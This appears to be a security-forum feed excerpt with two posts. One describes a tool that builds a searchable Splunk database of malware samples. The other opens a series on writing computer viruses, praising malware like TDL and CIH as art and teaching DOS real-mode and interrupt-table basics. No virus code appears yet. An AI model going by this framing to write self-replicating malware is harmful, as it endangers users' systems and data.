<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/b/b880139511a20c5670a9edd0eb0ae6802cedc7ce.png" data-download-href="/uploads/short-url/qkafWCaXHFSnevgAyYFQxH9a2nk.png?dl=1" title=""><img src="/uploads/default/original/2X/b/b880139511a20c5670a9edd0eb0ae6802cedc7ce.png" alt="" data-base62-sha1="qkafWCaXHFSnevgAyYFQxH9a2nk" width="624" height="481" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b880139511a20c5670a9edd0eb0ae6802cedc7ce_2_10x10.png"></a></div><p></p>
<p>This code snippet is the most important part of the code the <strong>Database</strong> <strong>constructor</strong> function contains the following parameters:</p>
<ul>
<li>
<p>The name of the database, this name is very important as it defines the settings for the API queries and database creation. Why are the settings different for each database? Because Malshare and Malware Bazaar don’t share the same database structure, it must be normalized.</p>
</li>
<li>
<p>The API key for the database</p>
</li>
<li>
<p>The location of the database URL, in the context of Malware Bazaar the <strong>recent</strong> database contains only recent additions to the database that arrived to the bazaar database. To get the full database please use this URL: <a href="https://bazaar.abuse.ch/export/csv/full/" rel="noopener nofollow ugc">https://bazaar.abuse.ch/export/csv/full/</a></p>
</li>
<li>
<p>The list of all the header fields the programmer wants to extract from the database. Why does this matter? Because the Malware Bazaar database contains a lot of unnecessary header fields and Malshare doesn’t even have header field values. This parameter aids to either extract specific header fields from the database or if no header fields exists the default header value is created, which is always <strong>sha256_hash</strong>.</p>
</li>
<li>
<p>Boolean flag indicating if the raw database is zipped or not(The raw full database of malware bazaar is zipped, the recent one is not)</p>
</li>
</ul>
<p>The function <strong>createDatabase</strong> queries the database URLS and generates the database. It accepts one parameter:</p>
<ul>
<li>The number of bytes to remove from the start of the returned database. Why is this needed? Because the Malware Bazaar returns in its query response a lot of database file information which is not needed in the context of the database creation. It is exactly 467 bytes long and I’m simply filtering it out.</li>
</ul>
<p>How does it work?</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/0/07334a412fc0d43c1646c576218811e3a0d892f9.png" data-download-href="/uploads/short-url/11HeiWkwsbwcQKwayXaFMWtG0xX.png?dl=1" title=""><img src="/uploads/default/original/2X/0/07334a412fc0d43c1646c576218811e3a0d892f9.png" alt="" data-base62-sha1="11HeiWkwsbwcQKwayXaFMWtG0xX" width="624" height="449" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/0/07334a412fc0d43c1646c576218811e3a0d892f9_2_10x10.png"></a></div><p></p>
<p>First the function checks if a path to the database exists, if it doesn’t it creates one. If no database file exists, the function queries the database from the URL and writes it to current working directory. It unzips the database if needed and filters out double quotes and space characters from the database.</p>
<p>Finally the function <strong>generateFullDB</strong> accepts two Database objects and merges them together. The second parameter is optional, If one wants to create a main database a None value can be passed.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/9/915ddd1a204b279f5dd695295ec0343044ec952e.png" data-download-href="/uploads/short-url/kJYkMAKrjYov1nvIDQeJTzBrlXU.png?dl=1" title=""><img src="/uploads/default/original/2X/9/915ddd1a204b279f5dd695295ec0343044ec952e.png" alt="" data-base62-sha1="kJYkMAKrjYov1nvIDQeJTzBrlXU" width="624" height="405" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/915ddd1a204b279f5dd695295ec0343044ec952e_2_10x10.png"></a></div><p></p>
<p>First the function creates a full data frame, what this does is sends out specific API queries to each database provider to extract extra data for each hash. This creates a normalized template for the main database. The functions who perform this action can be viewed in the <a href="https://github.com/DanusMinimus/MalwareLake/blob/master/module_api_parser.py" rel="noopener nofollow ugc">module_api_parser.py</a>.After the data frames were created, the function checks if a main database exists. If it doesn’t it creates a new one by concatenating both database objects. If a main database does exist, the function concatenates the database objects and appends them to the database ignoring the header names of the concatenated database objects.</p>
<p>The result of this should give you a CSV file containing the following template:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/3/3bea54ed5f45e8127619ef8dc0284648042399bf.png" data-download-href="/uploads/short-url/8y2dTRhPqCHnkNh7eNQs3vaUc7t.png?dl=1" title=""><img src="/uploads/default/original/2X/3/3bea54ed5f45e8127619ef8dc0284648042399bf.png" alt="" data-base62-sha1="8y2dTRhPqCHnkNh7eNQs3vaUc7t" width="519" height="263" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/3bea54ed5f45e8127619ef8dc0284648042399bf_2_10x10.png"></a></div><p></p>
<p>It’s worth noting the Malware Bazaar database is very rich and detailed while Malshare kind of lacks some values I wish it had. This database can be uploaded to any SIEM platform in my case I chose Splunk(you can learn about Splunk for free here <a href="https://www.splunk.com/en_us/training/courses/splunk-fundamentals-1.html" rel="noopener nofollow ugc">https://www.splunk.com/en_us/training/courses/splunk-fundamentals-1.html</a>!) Which resulted in the creation of the following:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/4/4cff6aae31b7b481c981eb55bff7216487e262d1.png" data-download-href="/uploads/short-url/aZ9vXMX4uhhWDnOioRaBv5eEg9z.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4cff6aae31b7b481c981eb55bff7216487e262d1_2_624x269.png" alt="" data-base62-sha1="aZ9vXMX4uhhWDnOioRaBv5eEg9z" width="624" height="269" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4cff6aae31b7b481c981eb55bff7216487e262d1_2_624x269.png, https://0x00sec.s3.amazonaws.com/optimized/2X/4/4cff6aae31b7b481c981eb55bff7216487e262d1_2_936x403.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/4/4cff6aae31b7b481c981eb55bff7216487e262d1_2_1248x538.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/4/4cff6aae31b7b481c981eb55bff7216487e262d1_2_10x10.png"></a></div><p></p>
<p>I can use this dashboard to search for samples by <strong>Time</strong>, by their <strong>File Type</strong>, by their <strong>Signature</strong>, by their <strong>Tags</strong>, by their <strong>Virus Total Score</strong> and by their <strong>SHA256 hash</strong>. Thus, allowing to access a wide variety of unique malware samples for example, here are all the malware samples<br>
that have a virus total score lower than 5 - which is implies really low detection rate:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/8/8ec4357d046cd9e83a107c987a7d9ce34aac7734.png" data-download-href="/uploads/short-url/kmYaWwPv31LIfqET4JHhZomFcK8.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8ec4357d046cd9e83a107c987a7d9ce34aac7734_2_624x269.png" alt="" data-base62-sha1="kmYaWwPv31LIfqET4JHhZomFcK8" width="624" height="269" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8ec4357d046cd9e83a107c987a7d9ce34aac7734_2_624x269.png, https://0x00sec.s3.amazonaws.com/optimized/2X/8/8ec4357d046cd9e83a107c987a7d9ce34aac7734_2_936x403.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/8/8ec4357d046cd9e83a107c987a7d9ce34aac7734_2_1248x538.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8ec4357d046cd9e83a107c987a7d9ce34aac7734_2_10x10.png"></a></div><p></p>
<p>here are all the malware samples that arrived as files disguised as COVID-19 Information which also have a low virus total detection rate:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/6/64e24ed06db9872d0eddcffb1e493efbe89c5409.png" data-download-href="/uploads/short-url/eosBMAOqRBVLeq50ETtSZu1sFE5.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64e24ed06db9872d0eddcffb1e493efbe89c5409_2_624x285.png" alt="" data-base62-sha1="eosBMAOqRBVLeq50ETtSZu1sFE5" width="624" height="285" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64e24ed06db9872d0eddcffb1e493efbe89c5409_2_624x285.png, https://0x00sec.s3.amazonaws.com/optimized/2X/6/64e24ed06db9872d0eddcffb1e493efbe89c5409_2_936x427.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/6/64e24ed06db9872d0eddcffb1e493efbe89c5409_2_1248x570.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/64e24ed06db9872d0eddcffb1e493efbe89c5409_2_10x10.png"></a></div><p></p>
<p>That’s about it guys, have fun!</p>
            <p><small>9 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/fishing-for-malware/20111">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/fishing-for-malware/20111</link>
          <pubDate>Sat, 28 Mar 2020 15:14:14 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-20111</guid>
          <source url="https://d.clarkee.co.uk/t/fishing-for-malware/20111.rss">Fishing for Malware</source>
        </item>
        <item>
          <title>The Art Of Malware - Bringing the dead back to life</title>
          <dc:creator><![CDATA[Danus]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <h1>The Art of Malware</h1>
<h2>Bringing the Dead back to life</h2>
<p>I would like to dedicate this post(or perhaps series of posts) to <a href="https://en.wikipedia.org/wiki/Mark_Ludwig" rel="noopener nofollow ugc">Mark Ludwig</a>, the author of The <a href="https://www.amazon.com/Giant-Black-Book-Computer-Viruses/dp/144140712X?tag=0x00sec03-20" rel="noopener nofollow ugc">Giant Black Book of Computer Viruses</a>, who passed away in 2011. You’ve sparked my initial interest in viruses back in 2013 when I was only 15, and although back then I could barely understand your book I would like to make some closure in modern day era. You saw viruses as art and self-expression, back then that message resonated with me in levels I cannot describe and to this day I am affected by it.</p>
<p>Thank you.</p>
<p><strong>DISCLAIMER:</strong></p>
<p>I do not condone the development of malware for malicious purposes, the information obtained from this post is for educational purposes ONLY. Act with a clear mind, healthy conscious and responsibility please.</p>
<hr>
<h2><span>Philosophy as a case for developing malware</span></h2>
<p>Malware today is automatically described as a bad thing. Well it is, it’s called malicious software for a reason, but it can be viewed as a form of self-expression or art. One might ask “What the fuck?” but before you get into a rant about that why malware is made, that it’s motivations are to steal and to cause damage and nothing good comes out of it let me set up a different point of view for you. Usually malware requires creativity and to circumvent and bypass layers of defense or to manipulate the system it’s running on. the author of the malware must implement his ideas in a smart and creative way. Yes, it’s true that a lot of times it’s done terribly and sometimes the author either blindly copy pastes code of other malware authors or researchers but usually when its done with some innovation in mind the result is usually interesting. Perhaps not for the organization being attacked, perhaps not for the end user who gets his data stolen but FOR me, the analyst who ends up analyzing the product of the author, is very interesting.</p>
<p>Let’s take <a href="http://static1.esetstatic.com/us/resources/white-papers/TDL3-Analysis.pdf" rel="noopener nofollow ugc">TDL3</a>/4, A rootkit that caused significant amount of damage back in 2010-2013. Implementing hooks in the lowest levels of the kernel to avoid detection, creating its own virtual file system and building an actual virus as the first stage of attack. It infected computers in such a large scale that Microsoft literally pushed out specific mitigations against it, tools were developed to specially target it as it was not easily recognized by most anti viruses until late stages of its development and it even caused a large number of computers to crash when Windows updates were issued because it modified the system. Microsoft, as a mitigation attempt, simply didn’t install the update on the infected system. That’s just insane!</p>
<p>Sure, the main goal of the authors was to gain money, but they also proved to be creative and to have a deep understanding of Windows Internals in such depth that they were able to use the system against itself in ways that were not seen before. Even after Microsoft issued the new policy that all windows drivers must be digital signed by Microsoft to execute in the kernel, the authors pushed out TDL4 for 64-bit systems which started utilizing bootkit tactics to infect computers. The press called it <a href="https://web.archive.org/web/20111012123012/http:/technoglobes.com/2011/07/indestructible-tdl4-botnet/" rel="noopener nofollow ugc">“Indestructible”</a>. Malware wanted to be packed with TDL and Rootkit authors wanted to be TDL. <a href="https://en.wikipedia.org/wiki/Alureon" rel="noopener nofollow ugc">The fun ended mostly when the authors were arrested</a>.</p>
<p>If you read analysis repots of TDL you can’t stop gasping, why? Because it’s simply designed in with such creativity in mind that you can’t help but appreciate it.</p>
<p>Let’s take <a href="http://virus.wikidot.com/cih" rel="noopener nofollow ugc">CIH</a> as another case, A virus that was unleashed back in 1998 with reported costs of <a href="https://en.wikipedia.org/wiki/CIH_(computer_virus)" rel="noopener nofollow ugc">1 billion dollars of damage</a> and infecting <a href="https://en.wikipedia.org/wiki/CIH_(computer_virus)" rel="noopener nofollow ugc">~60 million machines</a>. Was developed to prove that AV companies are not worth their slack. But the unique way that CIH infects a computer is just mesmerizing. It scans the files for empty gaps, and then splits itself into chucks and injects itself into them. On its payload 26<sup>th</sup> of April triggers a MBR overwrite which renders the computer unbootable. Destructive? Yes. Amazing? Also, yes.</p>
<p>Malware in my point of view is as bad as bacteria, yes in our eyes it causes damage and might kill people but also, it’s a living organism acting on its nature. Our perception of that nature is bad because we attribute motivations to it, but without the authors motivation it’s simply just is and sometimes its incredible.</p>
<p>Yes, sometimes malware is just there to steal data and encrypt your files which in all honesty is kind of boring and annoying like mosquitoes and bad art, but sometimes it’s interesting and amazing like watching <a href="https://www.wired.com/2014/09/absurd-creature-of-the-week-disco-worm/" rel="noopener nofollow ugc">a parasitic worm turn snails into disco zombies.</a></p>
<hr>
<h1><span>Entering the morgue</span></h1>
<p>“Alright Danus, enough with the philosophy, let’s get into it!” Yeah yeah… alright let’s get into it. First, we must choose what exactly we are going to be developing, and who is a better candidate than viruses. What is a virus? Isn’t all malware a virus? No.</p>
<p>Viruses is by defined by Wikipedia as “A <strong>computer virus</strong> is a type of <a href="https://en.wikipedia.org/wiki/Computer_program" rel="noopener nofollow ugc">computer program</a> that, when executed, replicates itself by modifying other computer programs and inserting its own code.<sup><a href="https://en.wikipedia.org/wiki/Computer_virus#cite_note-Stallings_2012_p.182-1" rel="noopener nofollow ugc">[1]</a></sup> When this replication succeeds, the affected areas are then said to be “infected” with a computer virus.”</p>
<p>And yes, it is malware but its not a Trojan or a Worm. A <a href="https://en.wikipedia.org/wiki/Trojan_horse_(computing)" rel="noopener nofollow ugc">trojan</a> doesn’t self-replicate and is sometimes referred to as bacteria and a <a href="https://en.wikipedia.org/wiki/Computer_worm" rel="noopener nofollow ugc">worm</a> unlike a virus or a trojan doesn’t need user interaction to spread itself as it does so independently using the network.</p>
<p>But why a virus? Well, they are old and not much made anymore(<a href="https://en.wikipedia.org/wiki/Virut" rel="noopener nofollow ugc">VIRUT</a> infecting <a href="https://blog.malwarebytes.com/threat-analysis/2018/03/blast-from-the-past-stowaway-virut-delivered-with-chinese-ddos-bot/" rel="noopener nofollow ugc">malware developers</a> ahem). Most of them were not made to steal data and mostly were used as internet graffiti. Developing viruses proved skills, creativity and innovation back in the glory days of viruses but they are hardly utilized today because its hard to generate profit out of them. As far As I see it, that’s where it all started from and Intended to start from the beginning.</p>
<p>Now we need to choose a system to which to run these viruses on. I think a good candidate is Windows 7 x32 because its modern enough but limited in its defenses so it’s a perfect candidate.</p>
<p>Now we need to choose a virus, and what better place to find them than <a href="https://malware.wikia.org/wiki" rel="noopener nofollow ugc">https://malware.wikia.org/wiki</a>, <a href="http://virus.wikidot.com/" rel="noopener nofollow ugc">http://virus.wikidot.com/</a> or <a href="https://vxug.fakedoma.in/" rel="noopener nofollow ugc">https://vxug.fakedoma.in/</a>. But before we actually develop a real virus we must learn the basics of virus development using <a href="https://archive.org/details/TheGiantBlackBookOfComputerViruses2ndEd./mode/2up" rel="noopener nofollow ugc">The Giant Black Book of Computer Viruses 2nd</a> edition which can be found online in the internet archive.</p>
<p>First we’ll emulate the viruses on <a href="https://www.freedos.org/" rel="noopener nofollow ugc">FreeDOS</a><span>(get your copy here)</span> or on old versions of Windows(95/98) to view how they actually executed(because learning how different legacy operating systems work is fun) and then based on how they executed back then we’ll attempt to some how recreate them in Windows 7. Why DOS though? Can’t we just start with Windows? Well, yes, we can but I think one should understand why things today are as they are. What is protected mode and real mode? how virtual memory works? what defenses OS’s and hardware incorporate today that didn’t exist before? It is fundamental knowledge to understand why things are they way they are.</p>
<p>Why FreeDOS and not MS-DOS? I’m not that old school – FreeDOS provides us a platform to emulate our DOS viruses but has many modern useful built-in tools integrated into it plus VMware communicates perfectly with it. <a href="http://www.ibiblio.org/pub/micro/pc-stuff/freedos/files/ebook/using-freedos-24/using-freedos-24.pdf" rel="noopener nofollow ugc">Here’s a copy</a> of the user guide to FreeDOS.</p>
<p>Additionally, we’ll be coding in pure assembly and I’ll be using <a href="https://www.nasm.us/" rel="noopener nofollow ugc">NASM</a> for FreeDOS and <a href="http://www.visualmasm.com/download.html" rel="noopener nofollow ugc">Visual MASM</a> which as a very cool IDE that will allow us to code Windows assembly. but you can use any assembler you’d like. Why assembler though? Can’t we make viruses in C? or C#? or Java? No, because one; it would be defying the great tradition of making them in assembly and two; high level languages will not allow us to get creative as much as we’d like.</p>
<p><strong>Alright what else, please download:</strong></p>
<ol>
<li><strong><a href="https://www.sublimetext.com/" rel="noopener nofollow ugc">Sublime</a></strong></li>
<li><strong><a href="https://www.vmware.com/" rel="noopener nofollow ugc">VMware</a></strong></li>
<li><strong><a href="https://x64dbg.com/#start" rel="noopener nofollow ugc">X64dbg</a></strong></li>
<li><strong><a href="https://cutter.re/" rel="noopener nofollow ugc">Cutter</a></strong></li>
<li><strong><a href="https://hshrzd.wordpress.com/pe-bear/" rel="noopener nofollow ugc">PEBear</a></strong></li>
</ol>
<p><strong>Background knowledge REQUIRED:</strong></p>
<ol>
<li><strong>Experience Intel x86 assembly</strong></li>
<li><strong>Experience in C development</strong></li>
<li><strong>Basic with windows Internals</strong></li>
<li><strong>Basic in x64dbg</strong></li>
<li><strong>Basic experience with UNIX or DOS shell</strong></li>
</ol>
<p><strong>What I’ll be teaching you:</strong></p>
<ol>
<li>
<p><strong>Technical Knowledge</strong></p>
<ol>
<li><strong>Teach the reader how to program in DOS and Win32 assembly</strong></li>
<li><strong>Teach the reader the basics of old school virus architecture</strong></li>
<li><strong>Teach the reader about computer architecture history and Windows Internals</strong></li>
</ol>
</li>
<li>
<p><strong>Researcher Skills that you will have to acquire</strong></p>
<ol>
<li>
<p><strong>Data collection:</strong></p>
<ol>
<li>
<p><strong>Learn how to google, all your answers are found within the internet.</strong></p>
</li>
<li>
<p><strong>Look for only what you need to know. For example, if you are reading about Virtual Memory – don’t start digging into the how the electricity circuits in the MMU operate. It is a waste of time in the context of this article.</strong></p>
</li>
<li>
<p><strong>Learn to use CTRL + F, it will save you a lot of time.</strong></p>
</li>
<li>
<p><strong>MSDN is the bible of Windows API and it usually has all the information you need about specific function.</strong></p>
</li>
</ol>
</li>
<li>
<p><strong>Structure:</strong></p>
<ol>
<li>
<p><strong>Make a list of all the things you don’t know or don’t understand, break them into subcategories and make an effort to understand them.</strong></p>
</li>
<li>
<p><strong>I list a lot of resources, save time by reading only what you need to know.</strong></p>
</li>
<li>
<p><strong>Don’t get lost in the massive amount of information, breath… and orient yourself to reading only what is necessary.</strong></p>
</li>
</ol>
</li>
<li>
<p><strong>Seeing the bigger picture:</strong></p>
<ol>
<li><strong>If you see something you don’t understand in my code, don’t drown in the specifics. If it’s necessary to get into it I will get into it.</strong></li>
</ol>
</li>
</ol>
</li>
</ol>
<hr>
<h2>Note</h2>
<p>This is not an assembly tutorial, nor is it a Windows programming tutorial. It is assumed the reader can read and write basic Assembly, and has some experience with the Windows API. If the reader does not posses this knowledge, the information below might be a difficult read.</p>
<p><strong>Alright, let’s put our surgeon coats on and don’t forget the gloves cause we’re entering the morgue!</strong></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/7/78edfe4e5e4d2be32e792705e336a61b580fe8ae.png" data-download-href="/uploads/short-url/hfNc5ijYCJRH6CetMRu7NlMW0dU.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/78edfe4e5e4d2be32e792705e336a61b580fe8ae_2_624x414.png" alt="" data-base62-sha1="hfNc5ijYCJRH6CetMRu7NlMW0dU" width="624" height="414" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/78edfe4e5e4d2be32e792705e336a61b580fe8ae_2_624x414.png, https://0x00sec.s3.amazonaws.com/optimized/2X/7/78edfe4e5e4d2be32e792705e336a61b580fe8ae_2_936x621.png 1.5x, /uploads/default/original/2X/7/78edfe4e5e4d2be32e792705e336a61b580fe8ae.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/78edfe4e5e4d2be32e792705e336a61b580fe8ae_2_10x10.png"></a></div><p></p>
<hr>
<h1><span>Setting up FreeDOS using VMWare</span></h1>
<p>Run the <strong>FreeDOS</strong> image in VMware and it should install itself with relative ease.</p>
<p>Welcome to 16-bit real mode heaven. No memory protection, no protected mode, no multithreading no nothing. Just pureness. It’s my first time here too, I’ll be honest.</p>
<p>Let’s start by installing <strong>NASM</strong> so we can write assembly here so type down <strong>FDIMPLES</strong> and you should get this window:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/2/21ea5cef6138a696a6be3292c276f89c359cf82f.png" data-download-href="/uploads/short-url/4Q1SnaEwH1wVqHrTT4SKnX6fJ95.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/2/21ea5cef6138a696a6be3292c276f89c359cf82f_2_624x133.png" alt="" data-base62-sha1="4Q1SnaEwH1wVqHrTT4SKnX6fJ95" width="624" height="133" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/2/21ea5cef6138a696a6be3292c276f89c359cf82f_2_624x133.png, https://0x00sec.s3.amazonaws.com/optimized/2X/2/21ea5cef6138a696a6be3292c276f89c359cf82f_2_936x199.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/2/21ea5cef6138a696a6be3292c276f89c359cf82f_2_1248x266.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/21ea5cef6138a696a6be3292c276f89c359cf82f_2_10x10.png"></a></div><p></p>
<p>Use the arrow keys to scroll to “<strong>Development</strong>” and then scroll to “<strong>FASM</strong>” or “<strong>NASM</strong>”. Now you can use the arrow keys again to quit.</p>
<h2><span>Intel x86 Real Mode Basics</span></h2>
<p>So before I start explaining here is <a href="https://www.codeproject.com/script/Membership/View.aspx?mid=358302" rel="noopener nofollow ugc">the Intel Assembly Manual by Michael Chourdakis</a> if you get confused or stuck in my explanations you can always go back there, he explains it perfectly and also more in depth than I’ll explain here in my article. If I make a mistake, feel free to correct me privately <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
<p>So Real Mode is the bare basics state of the CPU, the BIOS runs on it. There is no memory protection, no virtual memory. Basically, it’s free for all.</p>
<p>What matters to us in the scope of this article that DOS executes in real mode, this means only one program can run at a time there is no multi-threading.</p>
<p>Memory access is limited to one megabyte and unlike in a normal windows environment there is no separation between the kernel and user applications, everything can access everything. So, applications can run anywhere in memory and have access for all memory, basically anyone can do anything. This what makes DOS such a fertile ground for viruses.</p>
<hr>
<h2><span>Register State in Real mode</span></h2>
<p><strong>General Purpose registers 16-bit registers</strong></p>
<p>AX, BX, CX, DX that you can split to their low or high counter parts</p>
<p><strong>Special Pointer Registers 16-bit registers</strong></p>
<p>BP(Base Frame pointer), SP(Stack Pointer), IP(Instruction Pointer</p>
<p><strong>Segment Registers 16-bit registers</strong></p>
<p>ES (Extra Segment), DS (Data Segment), SS(Stack Segment), CS(Code Segment)</p>
<p><strong>Indexing Registers 16-bit registers</strong></p>
<p>DI (Destination Index), SI (Source Index), BP, SP – These are the only registers that a programmer can use to indirectly access memory so executing mov ax, [cx] will not work.</p>
<p><strong><span>Memory Segmentation</span></strong></p>
<p>In Real mode programs access physical memory directly, there is no virtual memory abstractions. Memory was one megabyte long, but it was accessed through a 16 bit register base address and a 16-bit offset, This allowed to keep the registers 16 bit aligned but to extended memory to one megabyte. So, <strong>Segment</strong>: <strong>Pointer</strong>. One segment can reach 64 kilobytes. Why is this needed you might ask? Well it’s a logical memory abstraction, it helps to keep the memory access organized in the sense that each segment represents its function; Data is stored in the data segment, code is stored in the code segment and the stack is stored in the stack segment.</p>
<p>So basically, say our program has a <strong>Data segment</strong> that starts at <strong>0x2000</strong> and we want to access the <strong>10<sup>th</sup></strong> byte offset of that segment we’ll do that by referencing the memory <strong>DS</strong>:[<strong>10h</strong>]. but how is that calculated you might ask? Well we take the segment register value and multiply it by <strong>0x10</strong>, so we append another zero to it and then add the offset.</p>
<p><strong>0x2000</strong> * <strong>0x10</strong> + <strong>0x10</strong> = <strong>0x20010</strong>. This technique allowed programs to access up to 1 MEGABYTE OF RAM! Because the final value calculated is 20 bits long.</p>
<h2><span>Disk Operating System (DOS) Architecture</span></h2>
<p>Even though DOS can access up to 1 Megabytes of memory, the memory above <strong>0xA000</strong> is reserved for the system so <strong>DOS</strong> user applications could only access the lower 640 kilobyte boundary.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/5/5a401a9f3ea3a9f9f0fec4d3305b8b6c84978686.png" data-download-href="/uploads/short-url/cSojuYHqbr7EA340CzZd6WNQkFo.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5a401a9f3ea3a9f9f0fec4d3305b8b6c84978686_2_360x342.png" alt="" data-base62-sha1="cSojuYHqbr7EA340CzZd6WNQkFo" width="360" height="342" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5a401a9f3ea3a9f9f0fec4d3305b8b6c84978686_2_360x342.png, https://0x00sec.s3.amazonaws.com/optimized/2X/5/5a401a9f3ea3a9f9f0fec4d3305b8b6c84978686_2_540x513.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/5/5a401a9f3ea3a9f9f0fec4d3305b8b6c84978686_2_720x684.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/5a401a9f3ea3a9f9f0fec4d3305b8b6c84978686_2_10x10.png"></a></div><br>
<a href="http://www.philadelphia.edu.jo/academics/qhamarsheh/uploads/Lecture%2020%20----16-Bit%20MS-DOS%20Programming.pdf" rel="noopener nofollow ugc">credit</a><p></p>
<p>The first <strong>1024</strong> bytes (or first kilobyte) of the memory contains <strong>BIOS</strong> and <strong>DOS</strong> Interrupts. this memory area is also called the <strong>Interrupt Vector Table (IVT)</strong>. There are three types of interrupts – software interrupts which are triggered by the software (e.g. throw keyword in python) or in our case, <strong>DOS</strong>. Hardware interrupts which are triggered by external devices. Additionally, there are exceptions which are triggered by the CPU itself, there are three types of exceptions (faults, traps and aborts).</p>
<p>Hardware interrupts are not always expected, and the CPU can set them to be maskable(ignored) or non-maskable (cannot be ignored).</p>
<p>An example for a hardware interrupt would be interrupt number 9 which is issued when a key on a keyboard has been pressed. A good example for an exception would be interrupt number 0 which is triggered when the CPU is attempting to divide a number by zero. An example of a software interrupt which is handled by <strong>DOS</strong> itself would be interrupt number <strong>21h</strong>, which is the <strong>DOS</strong> <strong>API</strong> service.</p>
<p>Under <strong>MS</strong>-<strong>DOS</strong>, the <strong>BIOS</strong> handles interrupts <strong>0-31</strong> and <strong>DOS</strong> handles interrupts <strong>32-63</strong>, the rest <strong>64-255</strong> can be user defined. There are many types of <strong>DOS</strong> and <strong>BIOS</strong> interrupts and they all can be viewed in <a href="http://www2.ift.ulaval.ca/~marchand/ift17583/dosints.pdf" rel="noopener nofollow ugc">here</a>.</p>
<p>The <strong>IVT</strong> can be treated as an array, each cell in this array contains the address of each interrupt in memory. The lower two bytes are the location of the offset where the interrupt code is stored, and the upper two bytes is location of the segment where the interrupt is stored.</p>
<p>So, say we have linear address line at <strong>0000</strong>:<strong>0000</strong> which contains [<strong>10</strong>,<strong>20</strong>,<strong>30,40</strong>] the offset of the first interrupt would be <strong>0x2010</strong> and the segment of the first interrupt would be <strong>0x4030</strong>. Wait Danus, you got it reversed! not I did not, don’t forget the intel CPU is built with little endian architecture which means the least significant byte is stored first. So, the address of <strong>INT 0</strong> mis <strong>4030</strong>:<strong>2010</strong>(or to get the physical memory address <strong>4030h*10h+2010h = 42310h</strong>)‬</p>
<p>To execute an interrupt from the <strong>IVT</strong>, we use <strong>INT &lt;index in hex&gt;.</strong></p>
<p>Can we view the <strong>IVT</strong> somehow? Yes! We can use the <strong>DEBUG</strong> utility which can be used as system debugger utility. It allows us to dump and view memory, assemble instructions directly into memory and execute them. Since there is only one core and only one program running all the time, we can play around with DEBUG to debug the entire system much like a kernel debugger. But be careful, because as you remember we have access to entire memory of the system, and we have no limitations.</p>
<p>Let’s view the <strong>IVT</strong>. Let’s execute the <strong>DOS</strong> “<strong>DEBUG</strong>” command and then use <strong>D</strong> for dump and view the contents of area <strong>0000</strong>:<strong>0000</strong> which contains the IVT.</p>
